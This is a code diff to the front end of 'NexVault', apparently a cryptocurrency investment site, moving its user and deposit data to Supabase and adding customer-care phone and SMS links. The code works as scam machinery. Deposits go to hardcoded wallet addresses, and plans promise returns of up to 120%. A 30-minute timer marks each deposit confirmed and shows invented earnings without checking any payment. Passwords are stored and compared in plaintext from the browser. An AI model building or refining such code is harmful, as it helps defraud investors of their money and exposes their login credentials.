@@ -1347,7 +1347,10 @@
         <div class="footer-links">
           <a href="#">Terms</a>
           <a href="#">Privacy</a>
-          <a href="#">Support</a>
+          <a href="tel:7692188358">Support</a>
+        </div>
+        <div style="margin-top:12px;font-size:13px;color:var(--text2)">
+          📞 Customer Care: <a href="tel:7692188358" style="color:var(--gold);font-weight:600;text-decoration:none">+1 (769) 218-8358</a>
         </div>
       </div>
     </footer>
@@ -1443,6 +1446,28 @@
           confirmations.</div>
       </div>
     </div>
+
+    <!-- Floating Customer Care Button -->
+    <a href="sms:7692188358" style="
+      position:fixed;
+      bottom:28px;
+      right:28px;
+      z-index:999;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      background:linear-gradient(135deg,#22c55e,#16a34a);
+      color:#fff;
+      font-size:14px;
+      font-weight:700;
+      padding:14px 22px;
+      border-radius:50px;
+      text-decoration:none;
+      box-shadow:0 4px 24px rgba(34,197,94,0.4);
+      letter-spacing:0.3px;
+    ">
+      💬 <span>Customer Care</span>
+    </a>
   </div>
 
   <!-- ═══════════ MODALS ═══════════ -->
@@ -1599,14 +1624,23 @@
   <!-- Toast -->
   <div class="toast success" id="toast">Welcome back, test! 👋</div>
 
-  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
   <script>
-    // ──────────── STATE ────────────
-    const USERS_KEY = 'nexvault_users';
-    const SESSION_KEY = 'nexvault_session';
-    const INVESTMENTS_KEY = 'nexvault_investments';
+    // ──────────── SUPABASE ────────────
+    const SUPABASE_URL = 'https://pypazcjgbzmwpuenikjz.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_5QXPT4nJyb3Uut_jQoYaFA_zLHuxpGD';
+    const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
+    // Connection test — check browser console (F12) if registration fails
+    sb.from('users').select('count', { count: 'exact', head: true }).then(({ error }) => {
+      if (error) console.error('SUPABASE CONNECTION ERROR:', error.message, '| code:', error.code, '| hint:', error.hint);
+      else console.log('Supabase connected OK');
+    });
+
+    // ──────────── STATE ────────────
+    const SESSION_KEY = 'nexvault_session';
     let currentAsset = 'BTC';
+    let _activeTimers = [];
 
     const WALLETS = {
       BTC: 'bc1pu6ygxspvuau5m47652xnvg4vkcfnxf6dmzpts5arpdhpr8n0h3tqn06we9',
@@ -1615,19 +1649,16 @@
     };
 
     const PLANS = {
-      starter: { name: 'Starter Plan', min: 380, returnLow: 3, returnHigh: 5, duration: '7 – 14 days', risk: 'Low' },
-      growth: { name: 'Growth Plan', min: 580, returnLow: 8, returnHigh: 15, duration: '14 – 30 days', risk: 'Medium' },
-      advanced: { name: 'Advanced Plan', min: 780, returnLow: 20, returnHigh: 40, duration: '30 – 60 days', risk: 'High' },
-      longterm: { name: 'Long-Term Plan', min: 1080, returnLow: 60, returnHigh: 120, duration: '6 – 12 months', risk: 'Medium' },
+      starter:  { name: 'Starter Plan',   min: 380,  returnLow: 3,  returnHigh: 5,   duration: '7 – 14 days',    risk: 'Low'    },
+      growth:   { name: 'Growth Plan',    min: 580,  returnLow: 8,  returnHigh: 15,  duration: '14 – 30 days',   risk: 'Medium' },
+      advanced: { name: 'Advanced Plan',  min: 780,  returnLow: 20, returnHigh: 40,  duration: '30 – 60 days',   risk: 'High'   },
+      longterm: { name: 'Long-Term Plan', min: 1080, returnLow: 60, returnHigh: 120, duration: '6 – 12 months',  risk: 'Medium' },
     };
 
-    function getUsers() { return JSON.parse(localStorage.getItem(USERS_KEY) || '[]') }
-    function saveUsers(u) { localStorage.setItem(USERS_KEY, JSON.stringify(u)) }
-    function getSession() { return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null') }
-    function saveSession(u) { localStorage.setItem(SESSION_KEY, JSON.stringify(u)) }
-    function clearSession() { localStorage.removeItem(SESSION_KEY) }
-    function getInvestments(email) { return JSON.parse(localStorage.getItem(INVESTMENTS_KEY + '_' + email) || '[]') }
-    function saveInvestments(email, arr) { localStorage.setItem(INVESTMENTS_KEY + '_' + email, JSON.stringify(arr)) }
+    // ──────────── SESSION (localStorage only for current user) ────────────
+    function getSession() { return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null'); }
+    function saveSession(u) { localStorage.setItem(SESSION_KEY, JSON.stringify(u)); }
+    function clearSession() { localStorage.removeItem(SESSION_KEY); }
 
     // ──────────── PAGES ────────────
     function showPage(id) {
@@ -1649,7 +1680,6 @@
       backdrop.classList.remove('open');
       setTimeout(() => { backdrop.style.display = ''; }, 300);
     }
-
     function switchTab(tab) {
       document.getElementById('form-register').style.display = tab === 'register' ? 'block' : 'none';
       document.getElementById('form-login').style.display = tab === 'login' ? 'block' : 'none';
@@ -1661,60 +1691,67 @@
     }
 
     // ──────────── AUTH ────────────
-    function register() {
-      const name = document.getElementById('reg-name').value.trim();
+    async function register() {
+      const name  = document.getElementById('reg-name').value.trim();
       const email = document.getElementById('reg-email').value.trim();
-      const pass = document.getElementById('reg-pass').value;
+      const pass  = document.getElementById('reg-pass').value;
       const pass2 = document.getElementById('reg-pass2').value;
       const terms = document.getElementById('reg-terms').checked;
       let ok = true;
 
-      const setErr = (id, show) => {
+      const setErr = (id, show, msg) => {
         const el = document.getElementById(id);
         el.style.display = show ? 'block' : 'none';
         el.style.visibility = 'visible';
+        if (msg) el.textContent = msg;
         if (show) ok = false;
       };
 
-      setErr('err-reg-name', !name);
+      setErr('err-reg-name',  !name);
       setErr('err-reg-email', !email || !email.includes('@'));
-      setErr('err-reg-pass', pass.length < 8);
+      setErr('err-reg-pass',  pass.length < 8);
       setErr('err-reg-pass2', pass !== pass2);
-      const termsEl = document.getElementById('err-reg-terms');
-      termsEl.style.visibility = terms ? 'hidden' : 'visible';
+      document.getElementById('err-reg-terms').style.visibility = terms ? 'hidden' : 'visible';
       if (!terms) ok = false;
-
       if (!ok) return;
 
-      const users = getUsers();
-      if (users.find(u => u.email === email)) {
-        document.getElementById('err-reg-email').textContent = 'Email already registered';
-        document.getElementById('err-reg-email').style.display = 'block';
+      // Check duplicate email
+      const { data: existing } = await sb.from('users').select('id').eq('email', email).maybeSingle();
+      if (existing) {
+        setErr('err-reg-email', true, 'Email already registered');
         return;
       }
-      const user = { name, email, pass, joined: new Date().toISOString() };
-      users.push(user);
-      saveUsers(users);
-      saveSession(user);
+
+      const { data: newUser, error } = await sb.from('users').insert({
+        name, email, pass, joined: new Date().toISOString()
+      }).select().single();
+
+      if (error) { console.error('REGISTER ERROR:', error); toast('Failed: ' + (error.message || error.code || JSON.stringify(error)), 'error'); return; }
+
+      saveSession(newUser);
       closeModal('auth');
-      loadDashboard(user);
+      loadDashboard(newUser);
       toast('Account created! Welcome to NexVault 🎉', 'success');
     }
 
-    function login() {
+    async function login() {
       const email = document.getElementById('login-email').value.trim();
-      const pass = document.getElementById('login-pass').value;
+      const pass  = document.getElementById('login-pass').value;
       let ok = true;
       const setErr = (id, show) => { document.getElementById(id).style.display = show ? 'block' : 'none'; if (show) ok = false; };
       setErr('err-login-email', !email || !email.includes('@'));
       if (!ok) return;
-      const users = getUsers();
-      const user = users.find(u => u.email === email && u.pass === pass);
-      if (!user) {
-        document.getElementById('err-login-pass').style.display = 'block';
-        document.getElementById('err-login-pass').textContent = 'Incorrect email or password';
+
+      const { data: user, error } = await sb.from('users')
+        .select('*').eq('email', email).eq('pass', pass).maybeSingle();
+
+      if (error || !user) {
+        const el = document.getElementById('err-login-pass');
+        el.style.display = 'block';
+        el.textContent = 'Incorrect email or password';
         return;
       }
+
       saveSession(user);
       closeModal('auth');
       loadDashboard(user);
@@ -1723,63 +1760,77 @@
 
     function logout() {
       clearSession();
+      _activeTimers.forEach(clearTimeout);
+      _activeTimers = [];
       showPage('landing');
       toast('Logged out successfully', 'success');
     }
 
     // ──────────── DASHBOARD ────────────
-    function loadDashboard(user) {
+    async function loadDashboard(user) {
       document.getElementById('dash-name').textContent = user.name;
       document.getElementById('dash-email').textContent = user.email;
       document.getElementById('dash-avatar').textContent = user.name.charAt(0).toUpperCase();
-      renderInvestments(user.email);
-      // Re-schedule earnings reveal for any investments whose hour hasn't passed
-      const investments = getInvestments(user.email);
-      const now = Date.now();
-      investments.forEach((inv, idx) => {
-        if (inv.earnVisibleAt) {
-          const delay = new Date(inv.earnVisibleAt).getTime() - now;
-          if (delay > 0) {
-            setTimeout(() => {
-              const latest = getInvestments(user.email);
-              if (latest[idx]) { latest[idx].status = 'Active'; saveInvestments(user.email, latest); }
-              renderInvestments(user.email);
-            }, delay);
-          }
-        }
-      });
       showPage('dashboard');
+      await renderInvestments(user.id);
+      scheduleTimers(user.id);
     }
 
-    function renderInvestments(email) {
-      const investments = getInvestments(email);
+    async function scheduleTimers(userId) {
+      _activeTimers.forEach(clearTimeout);
+      _activeTimers = [];
+      const now = Date.now();
+      const { data: investments } = await sb.from('investments').select('*').eq('user_id', userId);
+      if (!investments) return;
+      investments.forEach(inv => {
+        if (!inv.earn_visible_at) return;
+        const delay = new Date(inv.earn_visible_at).getTime() - now;
+        if (delay > 0) {
+          const t = setTimeout(async () => {
+            await sb.from('investments').update({ status: 'Active' }).eq('id', inv.id);
+            renderInvestments(userId);
+            toast('Deposit confirmed! Your plan is now active. ✅', 'success');
+          }, delay);
+          _activeTimers.push(t);
+        }
+      });
+    }
+
+    async function renderInvestments(userId) {
+      const wrap = document.getElementById('invest-table-wrap');
+      wrap.innerHTML = `<div class="empty-state"><div style="font-size:40px;margin-bottom:8px">⏳</div><div style="font-weight:600">Loading…</div></div>`;
+
+      const { data: investments, error } = await sb.from('investments').select('*').eq('user_id', userId).order('created_at', { ascending: false });
+
+      if (error) { wrap.innerHTML = `<div class="empty-state"><p>Error loading investments.</p></div>`; return; }
+
       const now = new Date();
       let totalDep = 0, totalEarn = 0;
-      investments.forEach(inv => {
-        const earnVisible = inv.earnVisibleAt ? new Date(inv.earnVisibleAt) <= now : true;
-        if (earnVisible) {
-          totalDep += inv.amount;
-          totalEarn += (inv.earnedAfter1h || inv.earned);
+      (investments || []).forEach(inv => {
+        const visible = inv.earn_visible_at ? new Date(inv.earn_visible_at) <= now : true;
+        if (visible) {
+          totalDep  += parseFloat(inv.amount);
+          totalEarn += parseFloat(inv.earned_after || 0);
         }
       });
       const total = totalDep + totalEarn;
-      document.getElementById('dc-total').textContent = '$' + total.toFixed(2);
+      document.getElementById('dc-total').textContent     = '$' + total.toFixed(2);
       document.getElementById('dc-deposited').textContent = '$' + totalDep.toFixed(2);
-      document.getElementById('dc-earnings').textContent = '$' + totalEarn.toFixed(2);
-      document.getElementById('dc-active').textContent = investments.filter(i => i.status === 'Active').length;
+      document.getElementById('dc-earnings').textContent  = '$' + totalEarn.toFixed(2);
+      document.getElementById('dc-active').textContent    = (investments || []).filter(i => i.status === 'Active').length;
 
-      const wrap = document.getElementById('invest-table-wrap');
-      if (!investments.length) {
+      if (!investments || !investments.length) {
         wrap.innerHTML = `<div class="empty-state"><div style="font-size:40px;margin-bottom:8px">📊</div><div style="font-weight:600">No investments yet</div><p>Make your first deposit and start earning returns.</p><button class="btn btn-gold" style="margin-top:16px;padding:10px 24px;font-size:14px" onclick="openDepositModal()">Start Investing</button></div>`;
         return;
       }
-      let rows = investments.map(inv => {
-        const earnVisible = inv.earnVisibleAt ? new Date(inv.earnVisibleAt) <= now : true;
-        const displayEarned = earnVisible ? (inv.earnedAfter1h || inv.earned) : 0;
+
+      const rows = investments.map(inv => {
+        const visible = inv.earn_visible_at ? new Date(inv.earn_visible_at) <= now : true;
+        const displayEarned = visible ? parseFloat(inv.earned_after || 0) : 0;
         return `
     <tr>
       <td><strong>${inv.plan}</strong><br><span style="font-size:12px;color:var(--text3)">${inv.asset}</span></td>
-      <td>$${inv.amount.toFixed(2)}</td>
+      <td>$${parseFloat(inv.amount).toFixed(2)}</td>
       <td style="color:var(--green)">+$${displayEarned.toFixed(2)}</td>
       <td>${inv.duration}</td>
       <td><span class="status-badge status-${inv.status.toLowerCase()}">${inv.status}</span></td>
@@ -1817,37 +1868,40 @@
       navigator.clipboard.writeText(WALLETS[currentAsset]).then(() => toast('Address copied!', 'success'));
     }
 
-    function confirmDeposit() {
+    async function confirmDeposit() {
       const planKey = document.getElementById('dep-plan').value;
-      const plan = PLANS[planKey];
-      const amount = parseFloat(document.getElementById('dep-amount').value);
+      const plan    = PLANS[planKey];
+      const amount  = parseFloat(document.getElementById('dep-amount').value);
       if (!amount || amount < plan.min) {
         document.getElementById('err-dep-amount').style.display = 'block';
         return;
       }
       document.getElementById('err-dep-amount').style.display = 'none';
+
       const session = getSession();
       if (!session) return;
-      const avgReturn = (plan.returnLow + plan.returnHigh) / 2;
-      const earnedAfter1h = +(amount * (avgReturn / 100)).toFixed(2);
-      const investments = getInvestments(session.email);
-      const depositTime = new Date().toISOString();
-      investments.push({ plan: plan.name, asset: currentAsset, amount, earned: 0, earnedAfter1h, duration: plan.duration, status: 'Pending', date: depositTime, earnVisibleAt: new Date(Date.now() + 30 * 60 * 1000).toISOString() });
-      saveInvestments(session.email, investments);
+
+      const avgReturn  = (plan.returnLow + plan.returnHigh) / 2;
+      const earnedAfter = +(amount * (avgReturn / 100)).toFixed(2);
+      const earnVisibleAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
+
+      const { error } = await sb.from('investments').insert({
+        user_id:        session.id,
+        plan:           plan.name,
+        asset:          currentAsset,
+        amount,
+        earned_after:   earnedAfter,
+        duration:       plan.duration,
+        status:         'Pending',
+        earn_visible_at: earnVisibleAt,
+      });
+
+      if (error) { toast('Failed to submit deposit. Please try again.', 'error'); console.error(error); return; }
+
       closeModal('deposit');
-      renderInvestments(session.email);
       toast('Investment submitted! Awaiting confirmation. 🚀', 'success');
-      setTimeout(() => {
-        const inv = getInvestments(session.email);
-        inv[inv.length - 1].status = 'Active';
-        saveInvestments(session.email, inv);
-        renderInvestments(session.email);
-        toast('Deposit confirmed! Your plan is now active. ✅', 'success');
-      }, 30 * 60 * 1000);
-      // After 30 min, earnings and portfolio value become visible in stats
-      setTimeout(() => {
-        renderInvestments(session.email);
-      }, 30 * 60 * 1000);
+      await renderInvestments(session.id);
+      scheduleTimers(session.id);
     }
 
     // ──────────── COPY ADDR ────────────
@@ -1865,27 +1919,22 @@
     }
 
     // ──────────── INIT ────────────
-    (function () {
+    (async function () {
       const session = getSession();
-      if (session) { loadDashboard(session); }
+      if (session) { await loadDashboard(session); }
       updateDepAddr();
       document.querySelectorAll('.modal-backdrop').forEach(bd => {
         bd.addEventListener('click', e => {
-          if (e.target === bd) {
-            const id = bd.id.replace('modal-', '');
-            closeModal(id);
-          }
+          if (e.target === bd) closeModal(bd.id.replace('modal-', ''));
         });
       });
       document.addEventListener('keydown', e => {
         if (e.key === 'Escape') {
-          document.querySelectorAll('.modal-backdrop.open').forEach(bd => {
-            const id = bd.id.replace('modal-', '');
-            closeModal(id);
-          });
+          document.querySelectorAll('.modal-backdrop.open').forEach(bd => closeModal(bd.id.replace('modal-', '')));
         }
       });
-    })();</script>
+    })();
+  </script>
 
 
 </body>
